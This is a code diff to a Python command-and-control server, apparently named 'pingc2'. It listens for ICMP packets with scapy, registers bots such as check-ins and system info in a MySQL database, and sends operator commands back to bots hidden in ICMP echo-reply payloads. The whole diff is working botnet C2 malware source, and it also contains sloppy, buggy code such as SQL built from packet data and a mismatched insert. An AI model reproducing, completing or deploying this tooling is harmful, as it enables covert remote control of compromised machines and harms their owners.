@@ -17,6 +17,21 @@ from scapy.all import *
 #def updateCommand():
 #	return command
 
+def addBot(srcIP,name,os):
+	print "[*] Adding bot"
+	db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+        cur = db.cursor()
+	try:
+		cur.execute("""insert into bots (remoteip,name,os) values(%s,%s,%s)""",(srcIP,name,os))
+                db.commit()
+        except:
+        	print "[X] Error adding bot to database"	
+
 def displayMenu():
 	listener = False
 	print "\nChoose an option"
@@ -60,30 +75,54 @@ def c2main(command):
                 		request = p['Raw'].load
                         	ip_id = p['IP'].id
                        		icmp_id = p['ICMP'].id
-                       		#print "[*] Request: " + request
-				if request == 'What shall I do master?':
+                       		print "[*] Request: " + request
+				if 'What shall I do master?' in request:
 					#command=updateCommand()
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
-                                	#resp.show2()
-                                	send(resp)
-					print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
-					displayMenu()
-					print "Option: "
-                        	elif request == 'Checkin':
+					query = "select id from bots where id="+request[24:]
+					cur.execute(query)
+					row = cur.fetchall()
+					print "[D] Row: " + row	
+					if row:
+						print "[*] Bot ID exists, sending command"
+						resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
+						#resp.show2()
+                                		send(resp)
+						print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
+						displayMenu()
+						print "Option: "
+					else:
+						print "[*] Client not registered"
+                        	elif 'Checkin' in request:
 					# Build checkin database and info to capture
 					print "\n[*] %s checking in" % p['IP'].src
+					checkinInfo = request[8:].split()
+                                        addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
+					query='select max(id) from bots'
+					cur.execute(query)
+					row = cur.fetchall()
+					for i in row:
+						print "[D] row-botid:",i[0]
+						botId=i[0]
+					sendId = "id="+str(botId)
+					#print "[D] SendId: ",sendId
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(sendId)
+                                        #resp.show2()
+                                        send(resp)
+                                        #print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
+                                        displayMenu()
+                                        print "Option: "
 				elif 'sysinfo' in request:
 					# Build sysinfo capture system database
                         		#print "[D] Inside sysinfo"
 					sysinfo = request[8:].split()					
-					print "[D] Sysinfo[0]: " + sysinfo[0]
+					print "[D] Id: " + sysinfo[0]
                                 	print "\n[*] Received sysinfo from client: %s" % sysinfo
-					cur.execute("select * from bots where name=%s and remoteip=%s",(sysinfo[1],p['IP'].src))
+					cur.execute("select * from bots where id=%s",sysinfo[0])
                         		row = cur.fetchall()
                         		#print "[D] Row: ", row
 					if not row :
                                 		try:
-							cur.execute("""insert into bots (remoteip,name,os) values(%s,%s,%s)""",(p['IP'].src,sysinfo[1],sysinfo[0]))
+							cur.execute("""insert into bots (id,remoteip,name,os) values(%s,%s,%s)""",(sysinfo[0],p['IP'].src,sysinfo[1],sysinfo[0]))
                                         		db.commit()
 							print "[*] Adding machine from IP: ",p['IP'].src
                                 		except: 
